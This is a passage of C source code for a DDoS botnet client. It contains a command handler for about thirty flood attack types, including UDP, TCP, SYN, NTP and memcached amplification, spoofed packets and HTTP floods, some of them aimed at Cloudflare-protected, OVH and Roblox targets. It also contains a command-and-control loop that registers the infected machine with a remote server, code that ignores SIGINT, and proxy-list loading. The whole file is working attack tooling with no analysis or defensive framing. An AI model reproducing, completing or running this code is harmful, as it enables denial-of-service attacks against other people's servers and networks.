    pthread_t tids[MAX_THREADS_PER_ATTACK];
    int n = threads > MAX_THREADS_PER_ATTACK ? MAX_THREADS_PER_ATTACK : threads;
    for (int i = 0; i < n; i++) {
        ntp_args_t *a = malloc(sizeof(ntp_args_t));
        memcpy(a, base, sizeof(ntp_args_t));
        pthread_create(&tids[i], NULL, attack_mem, a);
        pthread_detach(tids[i]);
    }
}

void process_command(int wsock, const char *data) {
    char buf[4096];
    strncpy(buf, data, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char *args[32];
    int argc = 0;
    char *token = strtok(buf, " ");
    while (token && argc < 32) {
        args[argc++] = token;
        token = strtok(NULL, " ");
    }
    if (argc == 0) return;
    char *cmd = args[0];

    if (strcmp(cmd, "PING") == 0) {

        ws_send(wsock, "PONG");
        return;
    }

    if (cmd[0] != '.') {

        return;
    }

    if (strcmp(cmd, ".STOP-ALL") == 0) {

        stop_attacks = 1;
        return;
    }

    stop_attacks = 0;

    if (strcmp(cmd, ".UDP") == 0 && argc >= 6) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        int threads = atoi(args[5]);
        a.spoofit = argc >= 7 ? atoi(args[6]) : 0;
        launch_attack_threads(attack_udp, threads, &a);
    }

    else if (strcmp(cmd, ".UDP-SPOOF") == 0 && argc >= 7) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        a.spoofit = atoi(args[5]);
        int threads = atoi(args[6]);
        launch_attack_threads(attack_udp, threads, &a);
    }

    else if (strcmp(cmd, ".TCP") == 0 && argc >= 6) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        int threads = atoi(args[5]);
        a.spoofit = argc >= 7 ? atoi(args[6]) : 0;
        if (argc >= 8) strncpy(a.flags, args[7], sizeof(a.flags) - 1);
        launch_attack_threads(attack_tcp, threads, &a);
    }

    else if (strcmp(cmd, ".NTP") == 0 && argc >= 5) {
        ntp_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.threads = atoi(args[4]);
        launch_attack_ntp_threads(a.threads, &a);
    }

    else if (strcmp(cmd, ".MEM") == 0 && argc >= 5) {
        ntp_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.threads = atoi(args[4]);
        launch_attack_mem_threads(a.threads, &a);
    }

    else if (strcmp(cmd, ".ICMP") == 0 && argc >= 4) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        launch_attack_threads(attack_icmp, threads, &a);
    }

    else if (strcmp(cmd, ".POD") == 0 && argc >= 4) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        launch_attack_threads(attack_pod, threads, &a);
    }

    else if (strcmp(cmd, ".TUP") == 0 && argc >= 6) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        int threads = atoi(args[5]);
        launch_attack_threads(attack_tup, threads, &a);
    }

    else if (strcmp(cmd, ".HEX") == 0 && argc >= 5) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_hex, threads, &a);
    }

    else if (strcmp(cmd, ".ROBLOX") == 0 && argc >= 6) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        int threads = atoi(args[5]);
        launch_attack_threads(attack_roblox, threads, &a);
    }

    else if (strcmp(cmd, ".VSE") == 0 && argc >= 5) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_vse, threads, &a);
    }

    else if (strcmp(cmd, ".JUNK") == 0 && argc >= 6) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.size = atoi(args[4]);
        int threads = atoi(args[5]);
        launch_attack_threads(attack_junk, threads, &a);
        launch_attack_threads(attack_udp, threads, &a);
        launch_attack_threads(attack_tcp, threads, &a);
    }

    else if (strcmp(cmd, ".SYN") == 0 && argc >= 5) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_syn, threads, &a);
    }

    else if (strcmp(cmd, ".HTTPSTORM") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_storm, threads, &a);
    }

    else if (strcmp(cmd, ".HTTPGET") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_get, threads, &a);
    }

    else if (strcmp(cmd, ".HTTPCFB") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_cfb, threads, &a);
    }

    else if (strcmp(cmd, ".HTTPIO") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        if (strcmp(args[4], "PROXY") == 0 || strcmp(args[4], "proxy") == 0) a.cfbp = 0;
        else if (strcmp(args[4], "NORMAL") == 0 || strcmp(args[4], "normal") == 0) a.cfbp = 1;
        else a.cfbp = 2;
        launch_attack_threads(attack_httpio, threads, &a);
    }

    else if (strcmp(cmd, ".HTTPSPOOF") == 0 && argc >= 4) {
#ifdef USE_SSL
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        launch_attack_threads(attack_http_spoof, threads, &a);
#endif
    }

    else if (strcmp(cmd, ".UDP-PLAIN") == 0 && argc >= 5) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_udp_plain, threads, &a);
    }

    else if (strcmp(cmd, ".UDP-PPS") == 0 && argc >= 4) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        launch_attack_threads(attack_dns_pps, threads, &a);
    }

    else if (strcmp(cmd, ".HTTP2-RAW") == 0 && argc >= 4) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.end_time = time(NULL) + atoi(args[2]);
        int threads = atoi(args[3]);
        launch_attack_threads(attack_http2_raw, threads, &a);
    }

    else if (strcmp(cmd, ".UDP-GIGS") == 0 && argc >= 5) {
        attack_args_t a;
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_udp_gigs, threads, &a);
    }

    else if (strcmp(cmd, ".STDHEX") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_stdhex, threads, &a);
    }

    else if (strcmp(cmd, ".STD") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_std, threads, &a);
    }

    else if (strcmp(cmd, ".NFODROP") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_stdhex2, threads, &a);
    }

    else if (strcmp(cmd, ".OVHKILL") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_stdhex2, threads, &a);
    }

    else if (strcmp(cmd, ".XMAS") == 0 && argc >= 6) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.spoofit = atoi(args[4]);
        int ps = argc >= 6 ? atoi(args[5]) : 1024;
        a.size = ps > 0 ? ps : 1024;
        pthread_t tid;
        attack_args_t *ap = malloc(sizeof(attack_args_t));
        memcpy(ap, &a, sizeof(attack_args_t));
        pthread_create(&tid, NULL, attack_xmas, ap);
        pthread_detach(tid);
    }

    else if (strcmp(cmd, ".SYNFLOOD") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_syn_flood, threads, &a);
    }

    else if (strcmp(cmd, ".RST") == 0 && argc >= 5) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        int threads = atoi(args[4]);
        launch_attack_threads(attack_rst, threads, &a);
    }

    else if (strcmp(cmd, ".PPS-HAMMER") == 0 && argc >= 4) {
        attack_args_t a;
        memset(&a, 0, sizeof(a));
        strcpy(a.target, args[1]);
        a.port = atoi(args[2]);
        a.end_time = time(NULL) + atoi(args[3]);
        a.burst_threads = argc >= 5 ? atoi(args[4]) : 500;
        pthread_t tid;
        attack_args_t *ap = malloc(sizeof(attack_args_t));
        memcpy(ap, &a, sizeof(attack_args_t));
        pthread_create(&tid, NULL, attack_pps_hammer, ap);
        pthread_detach(tid);
    }

}

void c2_loop(void) {
    char arch[16];
    get_arch(arch);

    while (1) {
        stop_attacks = 0;

        get_public_ip();

        char arch_with_ip[80];
        if (public_ip_buf[0]) {
            snprintf(arch_with_ip, sizeof(arch_with_ip), "%s|%s", arch, public_ip_buf);
        } else {
            snprintf(arch_with_ip, sizeof(arch_with_ip), "%s", arch);
        }

        int wsock = ws_connect(SOCKS_ADDRESS, SOCKS_PORT);
        if (wsock < 0) {
            sleep(5);
            continue;
        }

        ws_send(wsock, "669787761736865726500");

        char buf[4096];
        int handshake_done = 0;
        while (!handshake_done) {
            int n = ws_recv(wsock, buf, sizeof(buf));
            if (n <= 0) {
                break;
            }

            if (strstr(buf, "Username")) {
                ws_send(wsock, "BOT");
            }
            else if (strstr(buf, "Password")) {
                unsigned char pwd[] = "\xff\xff\xff\xff=";
                ws_send_bin(wsock, pwd, 5);
            }
            else if (strstr(buf, "Arch")) {
                ws_send(wsock, arch_with_ip);
                handshake_done = 1;
            }
        }
        if (!handshake_done) {

            close(wsock);
            sleep(5);
            continue;
        }

        while (1) {
            if (ws_recv(wsock, buf, sizeof(buf)) <= 0) {
                stop_attacks = 1;
                break;
            }
            char *s = buf;
            while (*s == ' ' || *s == '\r' || *s == '\n') s++;
            if (*s == '\0') continue;

            process_command(wsock, s);
        }
        close(wsock);

        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    srand(time(NULL) ^ (getpid() << 16));
    init_rand(time(NULL) ^ getpid());
    getOurIP();
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, SIG_IGN);
#ifdef USE_SSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

#else

#endif

    FILE *fp = fopen("socks4.txt", "r");
    if (fp) {
        proxy_count = 0;
        char line[MAX_PROXY_LINE];
        while (fgets(line, sizeof(line), fp) && proxy_count < MAX_PROXIES) {
            line[strcspn(line, "\n")] = 0;
            if (strlen(line) > 0) {
                strcpy(proxies[proxy_count++], line);
            }
        }
        fclose(fp);
    }

    if (argc > 1) {
        char cmd_with_dot[64];
        if (argv[1][0] != '.') {
            cmd_with_dot[0] = '.';
            strncpy(cmd_with_dot + 1, argv[1], sizeof(cmd_with_dot) - 2);
            cmd_with_dot[sizeof(cmd_with_dot) - 1] = '\0';
        } else {
            strncpy(cmd_with_dot, argv[1], sizeof(cmd_with_dot) - 1);
        }

        char full_cmd[4096] = {0};
        for (int i = 1; i < argc; i++) {
            strcat(full_cmd, argv[i]);
            strcat(full_cmd, " ");
        }

        if (strcmp(cmd_with_dot, ".PPS-HAMMER") == 0 && argc >= 5) {
            attack_args_t a;
            strcpy(a.target, argv[2]);
            a.port = atoi(argv[3]);
            a.end_time = time(NULL) + atoi(argv[4]);
            a.burst_threads = argc > 5 ? atoi(argv[5]) : 500;
            pthread_t tid;
            attack_args_t *ap = malloc(sizeof(attack_args_t));
            memcpy(ap, &a, sizeof(attack_args_t));
            pthread_create(&tid, NULL, attack_pps_hammer, ap);
            pthread_join(tid, NULL);
            return 0;
        }

        else if (strcmp(cmd_with_dot, ".UDP-PLAIN") == 0 && argc >= 5) {
            attack_args_t a;
            strcpy(a.target, argv[2]);
            a.port = atoi(argv[3]);
            a.end_time = time(NULL) + atoi(argv[4]);
            int threads = argc > 5 ? atoi(argv[5]) : 1;
            pthread_t tids[threads];
            for (int i = 0; i < threads; i++) {
                attack_args_t *ap = malloc(sizeof(attack_args_t));
                memcpy(ap, &a, sizeof(attack_args_t));
                pthread_create(&tids[i], NULL, attack_udp_plain, ap);
            }
            for (int i = 0; i < threads; i++)
                pthread_join(tids[i], NULL);
            return 0;
        }

        else if (strcmp(cmd_with_dot, ".UDP-PPS") == 0 && argc >= 4) {
            attack_args_t a;
            strcpy(a.target, argv[2]);
            a.end_time = time(NULL) + atoi(argv[3]);
            int threads = argc > 4 ? atoi(argv[4]) : 1;
            pthread_t tids[threads];
            for (int i = 0; i < threads; i++) {
                attack_args_t *ap = malloc(sizeof(attack_args_t));
                memcpy(ap, &a, sizeof(attack_args_t));
                pthread_create(&tids[i], NULL, attack_dns_pps, ap);
            }
            for (int i = 0; i < threads; i++)
                pthread_join(tids[i], NULL);
            return 0;
        }

        else if (strcmp(cmd_with_dot, ".HTTP2-RAW") == 0 && argc >= 4) {
            attack_args_t a;
            strcpy(a.target, argv[2]);
            a.end_time = time(NULL) + atoi(argv[3]);
            int threads = argc > 4 ? atoi(argv[4]) : 1;
            pthread_t tids[threads];
            for (int i = 0; i < threads; i++) {
                attack_args_t *ap = malloc(sizeof(attack_args_t));
                memcpy(ap, &a, sizeof(attack_args_t));
                pthread_create(&tids[i], NULL, attack_http2_raw, ap);
            }
            for (int i = 0; i < threads; i++)
                pthread_join(tids[i], NULL);
            return 0;
        }

        else if (strcmp(cmd_with_dot, ".UDP-GIGS") == 0 && argc >= 5) {
            attack_args_t a;
            strcpy(a.target, argv[2]);
            a.port = atoi(argv[3]);
            a.end_time = time(NULL) + atoi(argv[4]);
            int threads = argc > 5 ? atoi(argv[5]) : 1;
            pthread_t tids[threads];
            for (int i = 0; i < threads; i++) {
                attack_args_t *ap = malloc(sizeof(attack_args_t));
                memcpy(ap, &a, sizeof(attack_args_t));
                pthread_create(&tids[i], NULL, attack_udp_gigs, ap);
            }
            for (int i = 0; i < threads; i++)
                pthread_join(tids[i], NULL);
            return 0;
        }

        else {
            process_command(-1, full_cmd);
        }
        return 0;
    }

    while (1) c2_loop();
    return 0;
}
